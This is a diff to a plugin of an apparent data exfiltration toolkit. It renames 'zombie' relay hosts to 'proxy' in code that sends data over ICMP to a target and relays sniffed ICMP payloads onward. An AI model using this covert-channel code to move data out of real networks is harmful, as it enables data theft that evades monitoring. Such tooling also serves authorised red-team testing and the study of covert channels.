@@ -28,8 +28,8 @@ def send_icmp(dst, data):
     s.close()
 
 def send(data):
-    if config.has_key('zombies') and config['zombies'] != [""]:
-        targets = [config['target']] + config['zombies']
+    if config.has_key('proxies') and config['proxies'] != [""]:
+        targets = [config['target']] + config['proxies']
         target = choice(targets)
     else:
         target = config['target']
@@ -73,14 +73,14 @@ def relay_icmp_packet(payload, src, dst):
     target = config['target']
     try:
         app_exfiltrate.log_message(
-                'info', "[zombie] [icmp] Relaying icmp packet to {0}".format(target))
+                'info', "[proxy] [icmp] Relaying icmp packet to {0}".format(target))
         send_icmp(target, payload)
     except:
         pass
 
-def zombie():
+def proxy():
     app_exfiltrate.log_message(
-            'info', "[zombie] [icmp] Listening for icmp packets")
+            'info', "[proxy] [icmp] Listening for icmp packets")
     sniff(handler=relay_icmp_packet)
 
 class Plugin:
@@ -88,4 +88,4 @@ class Plugin:
         global app_exfiltrate, config
         app_exfiltrate = app
         config = conf
-        app.register_plugin('icmp', {'send': send, 'listen': listen, 'zombie': zombie})
+        app.register_plugin('icmp', {'send': send, 'listen': listen, 'proxy': proxy})
